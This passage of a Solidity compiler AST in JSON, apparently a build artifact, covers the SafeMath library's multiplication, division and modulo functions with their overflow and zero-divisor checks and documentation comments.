																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 1171,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "2153:1:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2144:10:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 1173,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2156:35:4",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 1167,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "2136:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1174,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2136:56:4",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1175,
												"nodeType": "ExpressionStatement",
												"src": "2136:56:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1176,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1162,
													"src": "2212:1:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1153,
												"id": 1177,
												"nodeType": "Return",
												"src": "2205:8:4"
											}
										]
									},
									"documentation": "@dev Returns the multiplication of two unsigned integers, reverting on\noverflow.\n\n     * Counterpart to Solidity's `*` operator.\n\n     * Requirements:\n- Multiplication cannot overflow.",
									"id": 1179,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1150,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1147,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"scope": 1179,
												"src": "1763:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1146,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1763:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1149,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"scope": 1179,
												"src": "1774:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1148,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1774:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1762:22:4"
									},
									"returnParameters": {
										"id": 1153,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1152,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1179,
												"src": "1808:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1151,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1808:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1807:9:4"
									},
									"scope": 1226,
									"src": "1750:471:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1203,
										"nodeType": "Block",
										"src": "2756:266:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1191,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1189,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1183,
																"src": "2842:1:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1190,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2846:1:4",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "2842:5:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 1192,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2849:28:4",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 1188,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "2834:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1193,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2834:44:4",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1194,
												"nodeType": "ExpressionStatement",
												"src": "2834:44:4"
											},
											{
												"assignments": [
													1196
												],
												"declarations": [
													{
														"constant": false,
														"id": 1196,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"scope": 1203,
														"src": "2889:9:4",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1195,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2889:7:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1200,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1199,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1197,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1181,
														"src": "2901:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1198,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1183,
														"src": "2905:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2901:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2889:17:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1201,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1196,
													"src": "3013:1:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1187,
												"id": 1202,
												"nodeType": "Return",
												"src": "3006:8:4"
											}
										]
									},
									"documentation": "@dev Returns the integer division of two unsigned integers. Reverts on\ndivision by zero. The result is rounded towards zero.\n\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n`revert` opcode (which leaves remaining gas untouched) while Solidity\nuses an invalid opcode to revert (consuming all remaining gas).\n\n     * Requirements:\n- The divisor cannot be zero.",
									"id": 1204,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1184,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1181,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"scope": 1204,
												"src": "2702:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1180,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2702:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1183,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"scope": 1204,
												"src": "2713:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1182,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2713:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2701:22:4"
									},
									"returnParameters": {
										"id": 1187,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1186,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1204,
												"src": "2747:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1185,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2747:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2746:9:4"
									},
									"scope": 1226,
									"src": "2689:333:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1224,
										"nodeType": "Block",
										"src": "3546:85:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1216,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1214,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1208,
																"src": "3565:1:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1215,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3570:1:4",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3565:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 1217,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3573:26:4",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 1213,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "3557:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1218,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3557:43:4",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1219,
												"nodeType": "ExpressionStatement",
												"src": "3557:43:4"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1222,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1220,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1206,
														"src": "3618:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1221,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1208,
														"src": "3622:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3618:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1212,
												"id": 1223,
												"nodeType": "Return",
												"src": "3611:12:4"
											}
										]
									},
									"documentation": "@dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\nReverts when dividing by zero.\n\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\nopcode (which leaves remaining gas untouched) while Solidity uses an\ninvalid opcode to revert (consuming all remaining gas).\n\n     * Requirements:\n- The divisor cannot be zero.",
									"id": 1225,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1209,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1206,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"scope": 1225,
												"src": "3492:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1205,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3492:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1208,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"scope": 1225,
												"src": "3503:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1207,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3503:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3491:22:4"
									},
									"returnParameters": {
										"id": 1212,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1211,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 1225,
												"src": "3537:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1210,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3537:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3536:9:4"
									},
									"scope": 1226,
									"src": "3479:152:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 1227,
							"src": "604:3030:4"
						}
					],
					"src": "0:3636:4"
				},
				"id": 4
			}
		}
	}
}